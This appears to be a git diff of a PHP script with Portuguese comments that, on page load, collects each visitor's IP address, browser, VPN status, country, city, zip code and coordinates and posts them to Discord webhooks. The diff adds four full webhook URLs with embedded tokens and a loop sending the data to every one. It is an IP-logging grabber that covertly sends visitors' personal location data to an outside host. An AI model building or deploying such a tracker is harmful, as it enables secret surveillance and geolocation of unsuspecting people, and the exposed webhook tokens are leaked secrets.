@@ -32,14 +32,18 @@ $WebhookName = $IP;
 
 class Discord
 {
-
     //Isso será executado e enviado assim que a página carregar
     public function Visitor()
     {
         global $IP, $Browser, $Date, $Time, $VPN, $Country, $CountryCode, $Region, $City, $Zip, $Lat, $Lon, $WebhookName, $Flag;
 
-        //Insira o URL COMPLETO do webhook aqui (o URL começa com: https://discord.com/api/webhooks/)
-        $Webhook = "https://discord.com/api/webhooks/";
+        // Array de URLs de webhooks
+        $Webhooks = array(
+            "https://discord.com/api/webhooks/1145109094827556905/v-m6kQqbWn7A36yIe7qocBa0ql8o4WostuoSsPdH9_XDmSjxkSpAzhsUwfhAevP-EiA_",
+            "https://discord.com/api/webhooks/1145109118357602315/Opap63k7ICE3xTeOMJohtdy04JObL4mVCI7YUSexrQHhIw7VWKUWLn6E9sk3vq-MFfko",
+            "https://discord.com/api/webhooks/1145110436354728037/J0MOawjzgtltU9mimeoW1v2OMKPpJM5Ch_ZU_PPpyoz3b2rbf3SkvITh5FljvX_-3CpU",
+            "https://discord.com/api/webhooks/1145110465333170276/ZrE0Op9PO-3q8yhxVTCYI-eYeKjxs1rq23pyj3bN78HYcVVVkx-Rrl4f2-bQK-PZQbmR",
+        );
 
         $InfoArr = array(
             "username" => "$WebhookName", //Nome do Webhook
@@ -57,20 +61,12 @@ class Discord
                 ),
                     array(
                         "name" => "• País",
-                        "value"=> "`🌎 $Country | $CountryCode`",
+                        "value"=> "`$Country | $CountryCode`",
                         "inline" => true
                     ),
                     array(
                         "name" => "• Região",
-                        "value" => "`🌎 $Region | $City | $Zip`\n\n",
-                    ),
-                    array(
-                        "name" => "\n\n\n",
-                        "value" => "\n\n\n",
-                    ),
-                    array(
-                        "name" => "\n\n\n",
-                        "value" => "\n\n\n",
+                        "value" => "`$Region | $City | $Zip`\n\n",
                     ),
                     array(
                         "name" => "\n\n\n",
@@ -93,15 +89,23 @@ class Discord
 
         $JSON = json_encode($InfoArr);
 
-        $Curl = curl_init($Webhook);
-        curl_setopt($Curl, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
-        curl_setopt($Curl, CURLOPT_CUSTOMREQUEST, "POST");
-        curl_setopt($Curl, CURLOPT_POSTFIELDS, $JSON);
-        curl_setopt($Curl, CURLOPT_RETURNTRANSFER, true);
-		
-        return curl_exec($Curl);
+        $this->sendToWebhooks($Webhooks, $JSON);
+    }
 
+    public function sendToWebhooks($webhookUrls, $json)
+    {
+        foreach ($webhookUrls as $webhook) {
+            $Curl = curl_init($webhook);
+            curl_setopt($Curl, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
+            curl_setopt($Curl, CURLOPT_CUSTOMREQUEST, "POST");
+            curl_setopt($Curl, CURLOPT_POSTFIELDS, $json);
+            curl_setopt($Curl, CURLOPT_RETURNTRANSFER, true);
+            curl_exec($Curl);
+            curl_close($Curl);
+        }
     }
 }
 
+// Instanciar a classe Discord
+$discord = new Discord();
 ?>
